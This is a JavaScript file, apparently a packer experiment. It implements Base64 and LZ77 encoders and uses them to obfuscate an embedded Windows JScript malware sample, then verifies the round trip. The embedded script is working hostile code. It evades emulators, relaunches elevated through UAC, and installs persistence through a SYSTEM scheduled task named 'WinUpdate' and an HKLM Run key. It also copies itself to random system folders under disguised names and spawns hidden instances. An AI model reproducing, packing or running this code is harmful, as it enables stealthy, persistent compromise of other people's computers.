class Base {
    constructor() {

    }

    bitstringToByteArray(input) {
        let output = new Uint8Array(input.length / 8);

        for (let i = 0, j = 0; i < input.length; i += 8) {
            output[j++] = parseInt(input.substring(i, i + 8), 2);
        }

        return output;
    }

    byteArrayToBitstring(input) {
        let output = [];

        for (let i in input) output[i] = input[i].toString(2).padStart(8, 0);

        return output.join('');
    }

    stringToByteArray(input) {
        let output = new Uint8Array(input.length);

        for (let i in input) output[i] = input.charCodeAt(i);

        return output;
    }

    byteArrayToString(input) {
        let output = [];

        for (let i in input) output[i] = String.fromCharCode(input[i]);

        return output.join('');
    }

    decToHex(dec, padLength = 0) {
        return dec.toString(16).padStart(padLength, '0');
    }

    stringToHex(str) {
        let res = '';
        for (let i in str) {
            res += str[i].charCodeAt(0).toString(16).padStart(2, 0);
        }

        return res;
    }

    remap3to4chars(input, transform) {
        let resArr = new Array(4);

        resArr[0] = (input[0] & 0xfc) >> 2;
        resArr[1] = ((input[0] & 0x03) << 4) + ((input[1] & 0xf0) >> 4);
        resArr[2] = ((input[1] & 0x0f) << 2) + ((input[2] & 0xc0) >> 6);
        resArr[3] = input[2] & 0x3f;

        if (transform && transform.constructor instanceof Function) {
            resArr = resArr.map(transform);
        }

        return resArr;
    }

    remap4to5chars(input, transform) {

    }

    encodeBitstring(input) {
        /**
         * Format: [ length of length of original string (1 byte) |  length of original bitstring | original string, padded to bytes ]
         */
        const slen = input.length.toString(16).padStart(2, 0);
        const slenlen = slen.length.toString(16).padStart(2, 0);
        const padded = input.match(/.{1,8}/g).map(c => parseInt(c, 2).toString(16).padStart(2, 0)).join('');

        return `${slenlen}${slen}${padded}`;
    }

    decodeBitstring(input) {
        const slenlen = parseInt(input.substring(0, 2), 16); // Length of slen
        const slen = parseInt(input.substring(2, 2 + slenlen), 16); // Length of original bitstring
        const parts = input.substring(2 + slenlen).match(/.{2}/g).map(c => parseInt(c, 16).toString(2).padStart(8, 0));

        if (slen % 8 !== 0) {
            parts[parts.length - 1] = parts[parts.length - 1].substring(8 - (slen % 8));
        }

        return parts.join('');
    }
}

class Base64 extends Base {
    constructor() {
        super();

        this.base64_chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    }

    encode(input) {
        let inputArray = this.stringToByteArray(input);
        let length = inputArray.length;

        const charArr = new Array(3);
        const b64Arr = new Array();

        let i = 0; // Count 0-3 in charArr
        let j = 0; // Counts through all characters in inputArray
        let s = 0; // Counts through all characters in output
        while (length--) {
            charArr[i++] = inputArray[j++];
            if (i == 3) {
                const remappedChars = this.remap3to4chars(charArr);

                for (let k = 0; k < 4; k++) {
                    b64Arr[s++] = this.base64_chars[remappedChars[k]];
                }

                i = 0;
            }
        }

        if (i) {
            for (let l = i; l < 3; l++) {
                charArr[l] = '\0';
            }

            const remappedChars = this.remap3to4chars(charArr);

            for (let m = 0; m < i + 1; m++) {
                b64Arr[s++] = this.base64_chars[remappedChars[m]];
            }

            while (i++ < 3) {
                b64Arr[s++] = '=';
            }
        }

        return b64Arr.join('');
    }

    decode(input) {
        let len = input.length;

        const charArray = new Array(4);

        let i = 0;
        let k = 0;

        const result = [];

        while (len--) {
            charArray[i++] = input[k++];

            if (i === 4) {
                result.push(
                    charArray.map(c => { // Get original char from base64_chars
                        let index = this.base64_chars.indexOf(c);
                        if (index !== -1) {
                            return index.toString(2).padStart(6, 0);
                        }
                    })
                    .filter(Boolean) // Clear empty values in array
                    .join('')
                    .match(/(.{8})/g) // Split string into pairs of 8bits
                    .map(m => String.fromCharCode(parseInt(m, 2))) // 8bit to Character
                    .join('')
                );

                i = 0;
            }
        }

        return result.join('');
    }
}

class LZ77 extends Base {
    constructor(window_size = 20) {
        super();
        this.MAX_WINDOW_SIZE = 400;

        this.window_size = Math.min(window_size, this.MAX_WINDOW_SIZE);

        this.lookahead_buffer_size = 15;
    }

    compress(data) {
        let i = 0;
        let output_buffer = '';

        while (i < data.length) {
            const match = this.findLongestMatch(data, i);

            if (match) {
                const {best_match_distance, best_match_length} = match;

                // Add 1 bit flag, followed by 12 bit for distance and 4 bit for the length of the match
                output_buffer += 1;
                output_buffer += String
                    .fromCharCode(best_match_distance >> 4)
                    .charCodeAt(0)
                    .toString(2)
                    .padStart(8, '0');

                output_buffer += String
                    .fromCharCode(((best_match_distance & 0xf) << 4) | best_match_length)
                    .charCodeAt(0)
                    .toString(2)
                    .padStart(8, '0');

                i += best_match_length;
            } else {
                // No useful match. Add 0 bit flag, followed by 8 bit for the character
                output_buffer += 0;
                output_buffer += data[i].charCodeAt(0).toString(2).padStart(8, '0');

                i += 1;
            }
        }

        let buff_len = output_buffer.length % 8;
        if (buff_len !== 0) {
            for (let i = 0; i < buff_len; i++) {
                output_buffer += 0;
            }
        }

        return output_buffer;
    }

    decompress(data) {
        let output_buffer = '';

        while (data.length >= 9) {
            let flag = data[0];
            data = data.slice(1);

            if (flag === '0') {
                let byte = String.fromCharCode(parseInt(data.substring(0, 8), 2));
                output_buffer += byte;

                data = data.slice(8);
            } else {
                let byte1 = parseInt(data.substring(0, 8), 2);
                let byte2 = parseInt(data.substring(8, 16), 2);

                data = data.slice(16);

                let distance = (byte1 << 4) | (byte2 >> 4);
                let length = (byte2 & 0xf);

                for (let i = 0; i < length; i++) {
                    output_buffer += output_buffer[output_buffer.length - distance];
                }
            }
        }

        return output_buffer;
    }

    findLongestMatch(data, current_position) {
        let k = 0;

        let end_of_buffer = Math.min(current_position + this.lookahead_buffer_size, data.length + 1);

        let best_match_distance = -1;
        let best_match_length = -1;

        for (let i = current_position + 2; i < end_of_buffer; i++) {
            let start_index = Math.max(0, current_position - this.window_size);
            let substring = data.substring(current_position, i);

            for (let j = start_index; j < current_position; j++) {
                let repetitions = Math.round(substring.length / (current_position - j));
                let last = substring.length % (current_position - j);

                let matched_string = '';
                for (let k = 0; k < repetitions; k++) {
                    matched_string += data.substring(j, current_position);
                }
                matched_string += data.substring(j, j + last);

                if (matched_string === substring && substring.length > best_match_length) {
                    best_match_distance = current_position - j;
                    best_match_length = substring.length;
                }
            }
        }

        if (best_match_distance > 0 && best_match_length > 0) {
            return {
                best_match_distance,
                best_match_length
            };
        } else {
            return null;
        }
    }

    safeEncode(input) {
        const compressed = this.compress(input);

        return this.encodeBitstring(compressed);
    }

    safeDecode(input) {
        const decoded = this.decodeBitstring(input);

        return this.decompress(decoded);
    }
}

let lz77 = new LZ77(4096);

var toEncode = `function Base() {
    this.servicename = 'WinUpdate';
    this.fileprefix = '_mys';
    this.procIdentifier = WScript.Arguments.length > 0 ? WScript.Arguments(0) : 'DANGEROUSANDMOVING';
    this.procLimit = 5; // 5 is more than enough, trust me
    this.maxInstances = 25;
};

// Shortkeys
Base.prototype._wsh = function() {
    return WScript.CreateObject('WScript.Shell');
};

// Utils
Base.prototype._queryWMI = function(wmiQuery) {
    var objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
    return objWMIService.ExecQuery(wmiQuery, null, 48);
};

Base.prototype._debugWmiProps = function(colObj) {
    if (typeof colObj['Properties_'] === 'undefined') {
        return false;
    } else {
        var props = new Enumerator(colObj.properties_);
        for (;!props.atEnd(); props.moveNext()) {
            WScript.Echo(props.item().name + ': ' + props.item().value);
        }
    }
};

Base.prototype._getGUID = function() {
    var t = WScript.CreateObject('Scriptlet.TypeLib');
    return t.guid.substr(1, 36);
};

Base.prototype._getRandName = function() {
    var fso = WScript.CreateObject('Scripting.FileSystemObject');
    var res = '';
    for (var i = 0; i < 5; i++) {
        res += fso.getTempName().substr(3, 5);
    }

    return res.substr(5, 11).toLowerCase();
};

Base.prototype._getts = function() {
    var d = new Date();
    var p = function(_d) {
        return ('0' + _d).slice(-2);
    };

    return [
        d.getFullYear(),
        p(d.getMonth() + 1),
        p(d.getDate())
    ].join('-') + ' ' + [
        p(d.getHours()),
        p(d.getMinutes()),
        p(d.getSeconds())
    ].join(':');
};

Base.prototype._writeLog = function(line) {
    var fso = WScript.CreateObject('Scripting.FileSystemObject');
    var logdir = this._wsh().expandEnvironmentStrings('%appdata%\\LegitCorp');
    var logfile = 'LICENSE';
    var fullpath = logdir + '\\' + logfile;

    if (!fso.folderExists(logdir)) {
        fso.createFolder(logdir);
    }

    var l = !fso.fileExists(fullpath) ? fso.CreateTextFile(fullpath, true) : fso.OpenTextFile(fullpath, 8);
    l.writeLine('[' + this._getts() + '] ' + line);
    l.close();
};

// Anti-emulator check
Base.prototype.isWScript = function() {
    return typeof WScript !== 'undefined' && typeof window === 'undefined' && typeof document === 'undefined';
};

// Check if script is running elevated
Base.prototype.isElevated = function() {
    var isElevated = true;

    try {
        this._wsh().regRead('HKEY_USERS\\S-1-5-19\\Environment\\TEMP');
    } catch (e) {
        isElevated = false;
    }

    return isElevated;
};

// Relaunch own process with elevated privileges (requires UAC)
Base.prototype.relaunchAsElevated = function() {
    var uac = WScript.CreateObject('Shell.Application');
    var args = ['//Nologo', '//E:jscript', '//B', WScript.ScriptFullName].join(' ');
    uac.shellExecute('cscript.exe', args, '', 'runas', 1);
};

Base.prototype.setMaxNumInstances = function() {
    var keyLoc = 'HKLM\\Software\\LegitCorp\\Version';

    try {
        this._wsh().regRead(keyLoc);
    } catch (e) {
        this._wsh().regWrite(keyLoc, 0, 'REG_DWORD');
    }
};

Base.prototype.maxNumInstancesReached = function() {
    var keyLoc = 'HKLM\\Software\\LegitCorp\\Version';

    var regval = this._wsh().regRead(keyLoc);
    var belowLimit = regval < this.maxInstances;

    if (belowLimit) {
        this._writeLog('Reached ' + regval + '/' + this.maxInstances + ' instances');
    }

    return !belowLimit;
};

Base.prototype.updateNumInstances = function() {
    var keyLoc = 'HKLM\\Software\\LegitCorp\\Version';
    var val = this._wsh().regRead(keyLoc);
    this._wsh().regWrite(keyLoc, val += 1, 'REG_DWORD');

    this._writeLog('Updated numinstances to ' + this._wsh().regRead(keyLoc));
};

// Register as scheduled task to run at system startup
// Grants persistency
Base.prototype.scheduleTask = function() {
    var wsh = this._wsh();
    wsh.Run('schtasks /create /sc onstart /ru SYSTEM /rl highest /tn ' + this.servicename + ' /tr "cscript.exe //NoLogo //E:jscript //B ' + WScript.ScriptFullName + '"');
};

// Check if task is scheduled
Base.prototype.checkScheduledTasks = function() {
    var exc = this._wsh().Exec('schtasks /query /tn ' + this.servicename);
    while (exc.status == 0) {
        WScript.Sleep(100);
    }

    // If exit code is 0, task exists
    return exc.exitCode === 0;
};

// Check persistency through Registry
Base.prototype.regRunKeyWritten = function() {
    var keyLoc = 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';
    var objExec = this._wsh().Exec('reg query ' + keyLoc);
    var strKeys = objExec.StdOut.ReadAll();
    var a = strKeys.split('\n');

    for (var i = 0; i < a.length; ++i) {
        if (a[i].match(WScript.ScriptName)) {
            return true;
        }
    }

    return false;
}

// Gain persistency through Registry
Base.prototype.writeRegRunKey = function() {
    var keyLoc = 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\' + this._getGUID();
    var keyPath = 'cscript.exe //nologo //e:jscript "' + WScript.ScriptFullName + '"';
    this._wsh().regWrite(keyLoc, keyPath, 'REG_SZ');
};

// Get own process ID by getting parent of child
Base.prototype.getOwnPID = function() {
    // Create child process
    var childTitle = +new Date + (Math.random() * 0xffff).toString(16);
    var childCmd = 'cmd.exe /k title ' + childTitle;

    this._wsh().Run(childCmd, 7, false);

    // Query for child process
    var getChildQuery = 'SELECT * FROM Win32_Process WHERE CommandLine LIKE "%cmd.exe%' + childTitle + '"';
    var colItems = new Enumerator(this._queryWMI(getChildQuery));

    var ownPID = 0;
    for (;!colItems.atEnd();colItems.moveNext()) {
        var procItem = colItems.item();

        ownPID = procItem.parentProcessId;
        procItem.terminate();
    }

    return ownPID;
};

// Get any process by PID
Base.prototype.getProcessByPID = function(pid) {
    var getChildQuery = 'SELECT * FROM Win32_Process WHERE ProcessId = ' + pid;
    var colItems = new Enumerator(this._queryWMI(getChildQuery));

    var ownPID = 0;
    for (;!colItems.atEnd();colItems.moveNext()) {
        var procItem = colItems.item();

        /*
        var ownerProps = procItem.ExecMethod_('GetOwner');
        var ownerSid = procItem.ExecMethod_('GetOwnerSid');

        procItem.Domain = ownerProps.Domain;
        procItem.User = ownerProps.User;
        procItem.Sid = ownerSid.Sid;
        */

        this._debugWmiProps(procItem);
    }
};

// Copies itself to a random location
Base.prototype.copySelf = function() {
    var fso = WScript.CreateObject('Scripting.FileSystemObject');
    var folders = ['%windir%\\system32','%homepath%','%appdata%','%programdata%','%programfiles%','%programfiles(x86)%','%temp%','%localappdata%','%public%','%commonprogramfiles%','%commonprogramfiles(x86)%'];
    var randdest = folders[Math.floor(Math.random() * folders.length)];
    var dirname = this._getRandName();
    var filename = this.fileprefix + this._getRandName() + '.tmp';

    var destdir = [this._wsh().expandEnvironmentStrings(randdest), dirname].join('\\');
    var destfile = destdir + '\\' + filename;

    var f = fso.createFolder(destdir);

    fso.copyFile(WScript.ScriptFullName, destfile);

    this._writeLog('Copied self to ' + destfile);

    this.spawnChild(destfile, [], 0);
};

// Spawns script as child process
Base.prototype.spawnChild = function(scriptPath, scriptArgs, showWindow) {
    scriptPath = scriptPath || WScript.ScriptFullName;
    scriptArgs = scriptArgs instanceof Array ? scriptArgs : [scriptArgs];
    showWindow = showWindow ? 1 : 0; // 0 is hidden, 1 is shown

    var uac = WScript.CreateObject('Shell.Application');
    var args = [
        '//Nologo', // Prevent logo display: No banner will be shown at execution time
        '//E:jscript', // Use engine for executing script
        // '//B', // Batch mode: Suppresses script errors and prompts from displaying
        '"' + scriptPath + '"', // Scriptname
    ].concat(scriptArgs).join(' ');

    uac.shellExecute(WScript.FullName, args, '', 'open', showWindow);
};

// Creates n instances of the current process
Base.prototype.spawnSelf = function() {
    // Check how many processes are running
    // If below this.procLimit, spawn process
    var getChildQuery = 'SELECT * FROM Win32_Process WHERE CommandLine LIKE "%' + this.procIdentifier + '%"';
    var colItems = new Enumerator(this._queryWMI(getChildQuery));

    var procCount = 0;
    for (;!colItems.atEnd();colItems.moveNext()) procCount++;

    if (procCount < this.procLimit) {
        this.spawnChild(WScript.ScriptFullName, [this.procIdentifier], true);
    }
};

// HTTP GET request
Base.prototype.httpGet = function(url) {
    var xhr = new ActiveXObject('MSXML2.XMLHTTP');
    xhr.open('GET', url, false);
    xhr.send();

    return xhr.responseText;
};

// HTTP POST request
Base.prototype.httpPost = function(url, data) {
    var xhr = new ActiveXObject('MSXML2.XMLHTTP');
    xhr.open('POST', url, false);
    xhr.setRequestHeader('Content-Type', 'text/plain');
    xhr.send(data);

    return xhr.responseText;
};

//////
var b = new Base();

// Check if we're in WScript and not an emulator
if (!b.isWScript()) {
    WScript.Quit();
}

// Check if we're running elevated
if (!b.isElevated()) {
    b.relaunchAsElevated();
    WScript.Quit();
}

// Check if the task is scheduled
if (!b.checkScheduledTasks()) {
    b.scheduleTask();
}

// Check if the RUN key was written
if (!b.regRunKeyWritten()) {
    b.writeRegRunKey();
    b.setMaxNumInstances();
}

// Check if the max num of instances was reached
if (!b.maxNumInstancesReached()) {
    b.updateNumInstances();
    b.copySelf();
}
`;

let b64 = new Base64();

// console.log(lz77.safeEncode(toEncode))

let lz77encoded = lz77.safeEncode(toEncode).match(/.{2}/g).map(c => String.fromCharCode(parseInt(c, 16))).join('');
let b64encoded = b64.encode(lz77encoded);
console.log(b64encoded);

let b64decoded = b64.decode(b64encoded);
const safeDecoded = lz77.safeDecode(b64decoded.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, 0)).join(''));

console.log('LZ77 encoded matches b64 decoded:', b64decoded === lz77encoded);
console.log('Original matches lz77-decoded:', safeDecoded === toEncode);

console.log({
    'Original': toEncode.length,
    'LZ77': lz77encoded.length,
    'B64': b64encoded.length
});

